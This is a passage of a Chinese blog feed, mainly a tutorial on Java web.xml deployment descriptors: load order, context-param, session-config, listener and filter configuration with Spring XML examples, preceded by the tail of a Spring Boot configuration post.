class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">java ‐jar configuration_file‐0.0.1‐SNAPSHOT.jar</span><br><span class="line">jar包之外的配置文件 yml‐‐&gt;yaml‐‐&gt;properties</span><br><span class="line">optional:classpath:&#x2F;config&#x2F; yml‐‐&gt;yaml‐‐&gt;properties</span><br><span class="line">optional:classpath:&#x2F; yml‐‐&gt;yaml‐‐&gt;properties</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;使用Spring-Initializer快速创建Spring-Boot项目&quot;&gt;&lt;a href=&quot;#使用Spring-Initializer快速创建Spring-Boot项目&quot; class=&quot;headerlink&quot; title=&quot;使用Spring Initializ
      
    
    </summary>
    
    
      <category term="Spring Boot" scheme="https://blog.kaluna.top/categories/Spring-Boot/"/>
    
    
  </entry>
  
  <entry>
    <title>web.xml文件详解</title>
    <link href="https://blog.kaluna.top/2021/10/26/web.xml%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3/"/>
    <id>https://blog.kaluna.top/2021/10/26/web.xml%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3/</id>
    <published>2021-10-26T02:02:09.928Z</published>
    <updated>2021-12-05T05:13:25.223Z</updated>
    
    <content type="html"><![CDATA[<h2 id="web工程加载web-xml过程"><a href="#web工程加载web-xml过程" class="headerlink" title="web工程加载web.xml过程"></a>web工程加载web.xml过程</h2><p>当启动一个WEB项目时，容器包括（JBoss、Tomcat等）首先会读取项目web.xml配置文件里的配置，当这一步骤没有出错并且完成之后，项目才能正常地被启动起来。</p><ol><li>启动WEB项目的时候，容器首先会去它的配置文件web.xml读取两个节点:  &lt;listener&gt;&lt;/listener&gt;和&lt;context-param&gt;&lt;/context-param&gt;。</li><li>紧接着，容器创建一个ServletContext（Application），这个WEB项目所有部分都将共享这个上下文。</li><li>容器以&lt;context-param&gt;&lt;/context-param&gt;的name作为键，value作为值，将其转化为键值对，存入ServletContext。</li><li>容器创建&lt;listener&gt;&lt;/listener&gt;中的类实例，根据配置的class类路径&lt;listener-class&gt;来创建监听，在监听中会有contextInitialized(ServletContextEvent args)初始化方法，启动Web应用时，系统调用Listener的该方法，在这个方法中获得：ServletContext application = ServletContextEvent.getServletContext(); context-param的值 = application.getInitParameter(“context-param的键”); 得到这个context-param的值之后，你就可以做一些操作了。</li><li>你可能想在项目启动之前就打开数据库，那么这里就可以在&lt;context-param&gt;中设置数据库的连接方式（驱动、url、user、password），在监听类中初始化数据库的连接。这个监听是自己写的一个类，除了初始化方法，它还有销毁方法，用于关闭应用前释放资源。比如:说数据库连接的关闭，此时，调用contextDestroyed(ServletContextEvent args)，关闭Web应用时，系统调用Listener的该方法。</li><li>接着，容器会读取&lt;filter&gt;&lt;/filter&gt;，根据指定的类路径来实例化过滤器。</li><li>以上都是在WEB项目还没有完全启动起来的时候就已经完成了的工作。如果系统中有Servlet，则Servlet是在第一次发起请求的时候被实例化的，而且一般不会被容器销毁，它可以服务于多个用户的请求。所以，Servlet的初始化都要比上面提到的那几个要迟。</li><li>总的来说，web.xml的加载顺序是：&lt;context-param&gt;-&gt;&lt;listener&gt;-&gt;&lt;filter&gt;-&gt;&lt;servlet&gt;。其中，如果web.xml中出现了相同的元素，则按照在配置文件中出现的先后顺序来加载。</li><li>对于某类元素而言，与它们出现的顺序是有关的。以&lt;filter&gt;为例，web.xml中当然可以定义多个&lt;filter&gt;，与&lt;filter&gt;相关的一个元素是&lt;filter-mapping&gt;，注意，对于拥有相同&lt;filter-name&gt;的&lt;filter&gt;和&lt;filter-mapping&gt;元素而言，&lt;filter-mapping&gt;必须出现在&lt;filter&gt;之后，否则当解析到&lt;filter-mapping&gt;时，它所对应的&lt;filter-name&gt;还未定义。web容器启动初始化每个&lt;filter&gt;时，按照&lt;filter&gt;出现的顺序来初始化的，当请求资源匹配多个&lt;filter-mapping&gt;时，&lt;filter&gt;拦截资源是按照&lt;filter-mapping&gt;元素出现的顺序来依次调用doFilter()方法的。&lt;servlet&gt;同&lt;filter&gt;类似，此处不再赘述。</li></ol><h2 id="web-xml标签详解"><a href="#web-xml标签详解" class="headerlink" title="web.xml标签详解"></a>web.xml标签详解</h2><h3 id="XML文档有效性检查"><a href="#XML文档有效性检查" class="headerlink" title="XML文档有效性检查"></a>XML文档有效性检查</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">web-app</span> <span class="meta-keyword">PUBLIC</span><span class="meta-string">"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"</span><span class="meta-string">"http://java.sun.com/dtd/web-app_2_3.dtd"</span> &gt;</span></span><br></pre></td></tr></table></figure><p>这段代码指定文件类型定义（DTD），可以通过它检查XML文档的有效性。下面显示的&lt;!DOCTYPE&gt;元素有几个特性，这些特性告诉我们关于DTD的信息： </p><p>web-app定义该文档（部署描述符，不是DTD文件）的根元素<br>PUBLIC意味着DTD文件可以被公开使用<br>-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN”意味着DTD由Sun Microsystems, Inc.维护。该信息也表示它描述的文档类型是DTD Web Application 2.3，而且DTD是用英文书写的。<br>URL“<a href="http://java.sun.com/dtd/web-app_2_3.dtd”表示D文件的位置。" target="_blank" rel="noopener">http://java.sun.com/dtd/web-app_2_3.dtd”表示D文件的位置。</a></p><h3 id="lt-web-app-gt-lt-web-app-gt"><a href="#lt-web-app-gt-lt-web-app-gt" class="headerlink" title="&lt;web-app&gt;&lt;/web-app&gt;"></a>&lt;web-app&gt;&lt;/web-app&gt;</h3><p>部署描述符的根元素是&lt;web-app&gt;，DTD文件规定&lt;web-app&gt;元素的子元素的语法如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">web-app</span> (<span class="meta-keyword">icon</span>?, <span class="meta-keyword">display-name</span>?, <span class="meta-keyword">description</span>?,<span class="meta-keyword">distributable</span>?, <span class="meta-keyword">context-param</span>*, <span class="meta-keyword">filter</span>*, <span class="meta-keyword">filter-mapping</span>*,<span class="meta-keyword">listener</span>*, <span class="meta-keyword">servlet</span>*, <span class="meta-keyword">servlet-mapping</span>*, <span class="meta-keyword">session-config</span>?,<span class="meta-keyword">mime-mapping</span>*, <span class="meta-keyword">welcome-file-list</span>?,<span class="meta-keyword">error-page</span>*, <span class="meta-keyword">taglib</span>*, <span class="meta-keyword">resource-env-ref</span>*, <span class="meta-keyword">resource-ref</span>*,<span class="meta-keyword">security-constraint</span>*, <span class="meta-keyword">login-config</span>?, <span class="meta-keyword">security-role</span>*,<span class="meta-keyword">env-entry</span>*,<span class="meta-keyword">ejb-ref</span>*, <span class="meta-keyword">ejb-local-ref</span>*)&gt;</span></span><br></pre></td></tr></table></figure><p>正如您所看到的，这个元素含有23个子元素，而且子元素都是可选的。问号（?）表示子元素是可选的，而且只能出现一次。星号（*）表示子元素可在部署描述符中出现零次或多次。有些子元素还可以有它们自己的子元素。web.xml文件中&lt;web-app&gt;元素声明的是下面每个子元素的声明。下面讲述部署描述符中可能包含的所有子元素。</p><p>注意：在Servlet 2.3中，子元素必须按照DTD文件语法描述中指定的顺序出现。比如：如果部署描述符中的&lt;web-app&gt;元素有&lt;servlet&gt;和&lt;servlet-mapping&gt;两个子元素，则&lt;servlet&gt;子元素必须出现在&lt;servlet-mapping&gt;子元素之前。在Servlet2.4中，顺序并不重要。</p><h3 id="lt-display-name-gt-lt-display-name-gt"><a href="#lt-display-name-gt-lt-display-name-gt" class="headerlink" title="&lt;display-name&gt;&lt;/display-name&gt;"></a>&lt;display-name&gt;&lt;/display-name&gt;</h3><p>&lt;display-name&gt;test-hwp-web-application&lt;/display-name&gt;定义了web应用的名称，可以在<a href="http://localhost:8080/manager/html中显示。如下所示：" target="_blank" rel="noopener">http://localhost:8080/manager/html中显示。如下所示：</a></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211026193745.png" alt="image-20211026110339589"></p><h3 id="lt-distributable-gt"><a href="#lt-distributable-gt" class="headerlink" title="&lt;distributable/&gt;"></a>&lt;distributable/&gt;</h3><p>&lt;distributable/&gt;可以使用distributable元素来告诉servlet/JSP容器，Web容器中部署的应用程序适合在分布式环境下运行。</p><h3 id="lt-context-param-gt-lt-context-param-gt"><a href="#lt-context-param-gt-lt-context-param-gt" class="headerlink" title="&lt;context-param&gt; &lt;/context-param&gt;"></a>&lt;context-param&gt; &lt;/context-param&gt;</h3><p>使用上下文初始化参数</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--****************************上下文初始化参数***************************--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>webAppRootKey<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>business.root<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- spring config --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>/WEB-INF/spring-configuration/*.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="lt-context-param-gt-解释："><a href="#lt-context-param-gt-解释：" class="headerlink" title="&lt;context-param&gt;解释："></a>&lt;context-param&gt;解释：</h4><p>&lt;context-param&gt;元素含有一对参数名和参数值，用作应用的Servlet上下文初始化参数，参数名在整个Web应用中必须是惟一的，在web应用的整个生命周期中上下文初始化参数都存在，任意的Servlet和jsp都可以随时随地访问它。</p><p>&lt;param-name&gt;：参数名<br>&lt;param-value&gt;：参数值。作为选择，可用&lt;description&gt;来描述参数。</p><h4 id="什么情况下使用，为什么使用-lt-context-param-gt-："><a href="#什么情况下使用，为什么使用-lt-context-param-gt-：" class="headerlink" title="什么情况下使用，为什么使用&lt;context-param&gt;："></a>什么情况下使用，为什么使用&lt;context-param&gt;：</h4><p>比如定义一个管理员email地址用来从程序发送错误，或者与你整个应用程序有关的其他设置。使用自己定义的设置文件需要额外的代码和管理；直接在你的程序中使用硬编码（Hard-coding）参数值会给你之后修改程序带来麻烦，更困难的是，要根据不同的部署使用不同的设置；通过这种办法，可以让其他开发人员更容易找到相关的参数，因为它是一个用于设置这种参数的标准位置。</p><h4 id="Spring配置文件："><a href="#Spring配置文件：" class="headerlink" title="Spring配置文件："></a>Spring配置文件：</h4><p>配置Spring，必须需要&lt;listener&gt;，而&lt;context-param&gt;可有可无，如果在web.xml中不写&lt;context-param&gt;配置信息，默认的路径是/WEB-INF/applicationContext.xml，在WEB-INF目录下创建的xml文件的名称必须是applicationContext.xml。如果是要自定义文件名可以在web.xml里加入contextConfigLocation这个context参数：在&lt;param-value&gt;&lt;/param-value&gt;里指定相应的xml文件名，如果有多个xml文件，可以写在一起并以“,”号分隔，比如在business-client工程中，我们采用了自定义配置方式，&lt;context-param&gt;配置如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- spring config --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>/WEB-INF/spring-configuration/*.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br></pre></td></tr></table></figure><p>对应工程目录结构如下所示：</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211026121857.png" alt="image-20211026121846743"></p><p>部署在同一容器中的多个Web项目，要配置不同的webAppRootKey，web.xml文件中最好定义webAppRootKey参数，如果不定义，将会缺省为“webapp.root”，如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 应用路径  --&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">context-param</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>webAppRootKey<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>webapp.root<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当然也不能重复，否则报类似下面的错误：</p><p>Web app root system property already set to different value: ‘webapp.root’ = [/home/user/tomcat/webapps/project1/] instead of [/home/user/tomcat/webapps/project2/] - Choose unique values for the ‘webAppRootKey’ context-param in your web.xml files!  </p><p>意思是“webapp.root”这个key已经指向了项目1，不可以再指向项目2。多个项目要对webAppRootKey进行配置，我们工程主要是让log4j能将日志写到对应项目根目录下，比如我们的项目的webAppRootKey为</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!—business-client应用路径</span>  <span class="attr">--</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">context-param</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>webAppRootKey<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>business.root<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">context-param</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">!—public-base应用路径</span>  <span class="attr">--</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">context-param</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>webAppRootKey<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>pubbase.root<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这样就不会出现冲突了。就可以在运行时动态地找到项目路径，在log4j.properties配置文件中可以按下面的方式使用${webapp.root}: log4j.appender.file.File=${webapp.root}/WEB-INF/logs/sample.log，就可以在运行时动态地找出项目的路径。</p><h4 id="多个配置文件引用处理"><a href="#多个配置文件引用处理" class="headerlink" title="多个配置文件引用处理"></a>多个配置文件引用处理</h4><p>如果web.xml中有contextConfigLocation参数指定的Spring配置文件，则会去加载相应的配置文件，而不会去加载/WEB-INF/下的applicationContext.xml。但是如果没有指定的话，默认会去/WEB-INF/下加载applicationContext.xml。在一个Spring的实际项目中，如果有多个Spring配置文件，多个配置文件可以在web.xml里用空格分隔写入，如：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">param-value</span>&gt;</span> applicationContext-database.xml,applicationContext.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br></pre></td></tr></table></figure><p>多个配置文件里的交叉引用可以用ref的external或bean解决</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"userService"</span> <span class="attr">class</span>=<span class="string">"domain.user.service.impl.UserServiceImpl"</span>&gt;</span> </span><br><span class="line">   <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"dbbean"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ref</span> <span class="attr">bean</span>=<span class="string">"dbBean"</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">property</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>在不同环境下如何获取</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>param_name<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>param_value<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此所设定的参数，在JSP网页中可以使用下列方法来取得：${initParam.param_name}</p><p>若在Servlet可以使用下列方法来获得：String param_name=getServletContext().getInitParamter(“param_name”);Servlet的ServletConfig对象拥有该Servlet的ServletContext的一个引用，所以可这样取得上下文初始化参数：getServletConfig().getServletContext().getInitParameter()也可以在Servlet中直接调用getServletContext().getInitParameter()，两者是等价的。</p><h3 id="lt-session-config-gt-lt-session-config-gt"><a href="#lt-session-config-gt-lt-session-config-gt" class="headerlink" title="&lt;session-config&gt;&lt;/session-config&gt;"></a>&lt;session-config&gt;&lt;/session-config&gt;</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Set timeout to 120 minutes --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">session-config</span>&gt;</span> </span><br><span class="line">   <span class="tag">&lt;<span class="name">session-timeout</span>&gt;</span>120<span class="tag">&lt;/<span class="name">session-timeout</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">session-config</span>&gt;</span></span><br></pre></td></tr></table></figure><p>&lt;session-timeout&gt;用来指定默认的会话超时时间间隔，以分钟为单位。该元素值必须为整数。如果 session-timeout元素的值为零或负数，则表示会话将永远不会超时。</p><h3 id="lt-listener-gt-lt-listener-gt"><a href="#lt-listener-gt-lt-listener-gt" class="headerlink" title="&lt;listener&gt;&lt;/listener&gt;"></a>&lt;listener&gt;&lt;/listener&gt;</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--****************************监听器配置*********************************--&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Spring的log4j监听器 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.springframework.web.util.Log4jConfigListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 与CAS Single Sign Out Filter配合，注销登录信息  --&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>com.yonyou.mcloud.cas.client.session.SingleSignOutHttpSessionListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Listener介绍"><a href="#Listener介绍" class="headerlink" title="Listener介绍"></a>Listener介绍</h4><p>&lt;listener&gt;为web应用程序定义监听器，监听器用来监听各种事件，比如：Application和Session事件，所有的监听器按照相同的方式定义，功能取决去它们各自实现的接口，常用的Web事件接口有如下几个：</p><p>ServletContextListener：用于监听Web Application的启动和关闭；<br>ServletContextAttributeListener：用于监听ServletContext范围（Application）内属性的改变；<br>ServletRequestListener：用于监听用户的请求；<br>ServletRequestAttributeListener：用于监听ServletRequest范围（Request）内属性的改变；<br>HttpSessionListener：用于监听用户session的开始和结束；<br>HttpSessionAttributeListener：用于监听HttpSession范围（Session）内属性的改变。</p><p>&lt;listener&gt;主要用于监听Web应用事件，其中有两个比较重要的Web应用事件：Application的启动和停止（starting up or shutting down）和Session的创建和失效（created or destroyed）。Application启动事件发生在应用第一次被Servlet容器装载和启动的时候；停止事件发生在Web应用停止的时候。Session创建事件发生在每次一个新的Session创建的时候，类似地Session失效事件发生在每次一个Session失效的时候。为了使用这些Web应用事件做些有用的事情，我们必须创建和使用一些特殊的“监听类”。它们是实现了以下两个接口中任何一个接口的简单java类：javax.servlet.ServletContextListener或javax.servlet.http.HttpSessionListener，如果想让你的类监听Application的启动和停止事件，你就得实现ServletContextListener接口；想让你的类去监听Session的创建和失效事件，那你就得实现HttpSessionListener接口。</p><h4 id="Listener配置"><a href="#Listener配置" class="headerlink" title="Listener配置"></a>Listener配置</h4><p>配置Listener只要向Web应用注册Listener实现类即可，无序配置参数之类的东西，因为Listener获取的是Web应用ServletContext（Application）的配置参数。为Web应用配置Listener的两种方式：</p><p>使用@WebListener修饰Listener实现类即可。<br>在web.xml文档中使用&lt;listener&gt;进行配置。<br>我们选择web.xml这种配置方式，只有一个元素&lt;listener-class&gt;指定Listener的实现类，如下所示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里的&lt;listener&gt;用于Spring的加载，Spring加载可以利用ServletContextListener实现，也可以采用load-on-startup Servlet 实现，但是，当&lt;filter&gt;需要用到bean时，加载顺序是先加载&lt;filter&gt;后加载&lt;servlet&gt;，则&lt;filter&gt;中初始化操作中的bean为null；所以，如果&lt;filter&gt;中要使用到bean，此时就可以根据加载顺序&lt;listener&gt; -&gt; &lt;filter&gt; -&gt;&lt;servlet&gt;，将spring的加载改成Listener的方式。</p><h5 id="采用load-on-startup-Servlet-实现"><a href="#采用load-on-startup-Servlet-实现" class="headerlink" title="采用load-on-startup Servlet 实现"></a>采用load-on-startup Servlet 实现</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span>  </span><br><span class="line">   <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>context<span class="tag">&lt;/<span class="name">servlet-narne</span>&gt;</span> </span><br><span class="line">   <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.context.ContextLoaderServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span>  </span><br><span class="line">   <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="利用ServletContextListener实现："><a href="#利用ServletContextListener实现：" class="headerlink" title="利用ServletContextListener实现："></a>利用ServletContextListener实现：</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br></pre></td></tr></table></figure><p>我们选择了第二种方式，在J2EE工程中web服务器启动的时候最先调用web.xml，上面这段配置的意思是加载spring的监听器，其中ContextLoaderListener的作用就是启动Web容器时，自动装配applicationContext.xml的配置信息，执行它所实现的方法。</p><h3 id="lt-filter-gt-lt-filter-gt"><a href="#lt-filter-gt-lt-filter-gt" class="headerlink" title="&lt;filter&gt;&lt;/filter&gt;"></a>&lt;filter&gt;&lt;/filter&gt;</h3><h4 id="Filter介绍"><a href="#Filter介绍" class="headerlink" title="Filter介绍"></a>Filter介绍</h4><p>Filter可认为是Servle的一种“加强版”，主要用于对用户请求request进行预处理，也可以对Response进行后处理，是个典型的处理链。使用Filter的完整流程是：Filter对用户请求进行预处理，接着将请求HttpServletRequest交给Servlet进行处理并生成响应，最后Filter再对服务器响应HttpServletResponse进行后处理。Filter与Servlet具有完全相同的生命周期，且Filter也可以通过<init-param>来配置初始化参数，获取Filter的初始化参数则使用FilterConfig的getInitParameter()。</p><p>换种说法，Servlet里有request和response两个对象，Filter能够在一个request到达Servlet之前预处理request，也可以在离开Servlet时处理response，Filter其实是一个Servlet链。以下是Filter的一些常见应用场合</p><ul><li>认证Filter</li><li>日志和审核Filter</li><li>图片转换Filter</li><li>数据压缩Filter</li><li>密码Filter</li><li>令牌Filter</li><li>触发资源访问事件的Filter</li><li>XSLT Filter</li><li>媒体类型链Filter</li></ul><p>Filter可负责拦截多个请求或响应；一个请求或响应也可被多个Filter拦截。创建一个Filter只需两步：</p><p>创建Filter处理类<br> Web.xml文件中配置Filter<br>Filter必须实现javax.servlet.Filter接口，在该接口中定义了三个方法：</p><p>void init(FilterConfig config)：用于完成Filter的初始化。FilteConfig用于访问Filter的配置信息。<br>void destroy()：用于Filter销毁前，完成某些资源的回收。<br>void doFilter(ServletRequest request,ServletResponse response,FilterChain chain)：实现过滤功能的核心方法，该方法就是对每个请求及响应增加额外的处理。该方法实现对用户请求request进行预处理，也可以实现对服务器响应response进行后处理—它们的分界线为是否调用了chain.doFilter(request，response)，执行该方法之前，即对用户请求request进行预处理，执行该方法之后，即对服务器响应response进行后处理。</p><h4 id="Filter配置"><a href="#Filter配置" class="headerlink" title="Filter配置"></a>Filter配置</h4><p>Filter配置与Servlet的配置非常相似，需要配置两部分：配置Filter名称和Filter拦截器URL模式。区别在于Servlet通常只配置一个URL，而Filter可以同时配置多个请求的URL。配置Filter有两种方式：</p><p>在Filter类中通过Annotation进行配置。<br> 